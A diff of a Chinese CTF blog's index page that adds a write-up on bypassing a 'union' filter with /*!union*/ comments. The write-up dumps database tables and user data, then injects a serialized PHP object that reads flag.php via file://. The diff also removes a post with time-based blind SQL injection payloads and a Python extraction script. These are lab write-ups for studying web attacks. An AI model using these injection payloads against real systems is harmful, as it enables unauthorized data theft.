@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,76 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-union绕过(反序列化)" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/28/union%E7%BB%95%E8%BF%87(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/" class="article-date">
+  	<time datetime="2021-08-27T16:00:00.000Z" itemprop="datePublished">2021-08-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/28/union%E7%BB%95%E8%BF%87(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/">
+        union绕过(反序列化)
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="union绕过-反序列化）"><a href="#union绕过-反序列化）" class="headerlink" title="union绕过(反序列化）"></a>union绕过(反序列化）</h1><p>通过看到/view.php?no=1，可以猜测可能是一个注入点，因此构造常见闭合点，可知数字型注入<br>通过构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,2,3,4%23</span><br></pre></td></tr></table></figure>
+<p>返回的信息可知，union被过滤点，因此可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”union“相当于”/*!union*/“</span><br></pre></td></tr></table></figure>
+<p>进行绕过，而后进行联合注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">-1 /*!union*/ select 1,database(),3,4%23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,database(),3,4 limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据表</span><br><span class="line">-1 /*!union*/ select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27; %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列</span><br><span class="line">-1 /*!union*/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列中字段的内容</span><br><span class="line">-1 /*!union*/ select 1,group_concat(no,&quot;----&quot;,username,&quot;----&quot;,passwd,&quot;----&quot;,data),3,4 from fakebook.users %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(no,&quot;----&quot;,username,&quot;----&quot;,passwd,&quot;----&quot;,data),3,4 from fakebook.users limit 1 offset 0%23</span><br></pre></td></tr></table></figure>
+<p>而后看到出现no、username、passwd、data字段的内容，可以看到data字段是序列化的内容，因此我们可以试一下robots.txt来读取源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以用file://协议来读取flag文件，猜测文件在/var/www/html/目录下，因此可以构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new UserInfo();</span><br><span class="line">$a-&gt;name=admin;</span><br><span class="line">$a-&gt;age=12;</span><br><span class="line">$a-&gt;blog=file://var/www/html/flag.php</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>而后构造payload，来控制检索的data数据，即可读出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 /*!union*/ select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-双写绕过(联合注入)" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -793,70 +863,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-双写绕过(时间注入)" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5)/" class="article-date">
-  	<time datetime="2021-07-26T16:00:00.000Z" itemprop="datePublished">2021-07-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5)/">
-        双写绕过(时间注入）
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="双写注入（吃鸡杯web问答题）"><a href="#双写注入（吃鸡杯web问答题）" class="headerlink" title="双写注入（吃鸡杯web问答题）"></a>双写注入（吃鸡杯web问答题）</h1><p>首先注册账号，并登录进行问答填写，发现没有出现flag，之后再回到登陆界面并打开源码，看到表单是post提交的，此时我们输入我们登录的账号以及密码，然后用bp进行抓包<br>可以看到两个我们可以控制的变量，分别为：username和studentid，此时我们用-1’#和-1’or1=1#和-1’||1=1#进行sql注入的测试，当然闭合符号可以多尝试”、”)、’)等，之后<br>‘为闭合符号，此时我们可以尝试union的联合注入，盲注以及堆叠注入，这里用的是时间注入。通过尝试我们知道=被过滤了且一些关键词被过滤了，因此空格用/**/代替，关键词可以使用双写绕过构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||if(ascii(substr(database(),1,1))&lt;80,sleep(2),1)#-------------------------得到数据库</span><br><span class="line"></span><br><span class="line">-1&#x27;||if(ascii(substr(seselectlect/**/group_coonncat(table_name)/**/from/**/iinnfoorrmatioonn_schema.tables/**/whewherere/**/table_schema/**/lilikeke/**/database()),1,1))&lt;80,sleep(1),1)#------------------得到数据表</span><br><span class="line"></span><br><span class="line">-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(column_name)/**/from/**/iinnfoorrmatioonn_schema.columns/**/whewherere/**/table_name/**/lilikeke/**/&#x27;ctf&#x27;),1,1))&lt;80,sleep(1),1)#----------------------得到数据列</span><br><span class="line"></span><br><span class="line">-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(value)/**/from/**/ctf),1,1))&lt;80,sleep(0.4),1)#---------------得到数据列中value的数据</span><br></pre></td></tr></table></figure>
-<p>由于一个一个试，效率很低，因此可以用脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import *</span><br><span class="line">url=&#x27;http://7de161e0-5158-4941-afc2-31cad344927a.challenge.ctf.show:8080/login.php&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,10000000):</span><br><span class="line">    min=32</span><br><span class="line">    max=128</span><br><span class="line">    while 1:</span><br><span class="line">        j=min+(max-min)//2</span><br><span class="line">        if min==j:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        #payload=&quot;-1&#x27;||if(ascii(substr(database(),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.5),1)#&quot;.format(i,j)</span><br><span class="line">        #payload=&quot;-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(table_name)/**/from/**/iinnfoorrmatioonn_schema.tables/**/whewherere/**/table_schema/**/lilikeke/**/database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(1),1)#&quot;.format(i,j)</span><br><span class="line">        payload=&quot;-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(column_name)/**/from/**/iinnfoorrmatioonn_schema.columns/**/whewherere/**/table_name/**/lilikeke/**/&#x27;ctf&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(1),1)#&quot;.format(i,j)</span><br><span class="line">        #payload=&quot;-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(value)/**/from/**/ctf),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.4),1)#&quot;.format(i,j)</span><br><span class="line"></span><br><span class="line">    #payload=&quot;&#x27;||ascii(substr((load_file(reverse(&#x27;dwssap/cte/&#x27;))),&#123;&#125;,1))&lt;&#123;&#125;#&quot;.format(i,j)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;username&#x27;:payload,</span><br><span class="line">            &#x27;studentid&#x27;:&#x27;1&#x27;,</span><br><span class="line">            &#x27;submit&#x27;:&#x27;提交&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=0.3)</span><br><span class="line">            #print(r.text)</span><br><span class="line">            min = j</span><br><span class="line">        except:</span><br><span class="line">            max = j</span><br><span class="line"></span><br><span class="line">        sleep(0.2)</span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
 	</div>
 
       
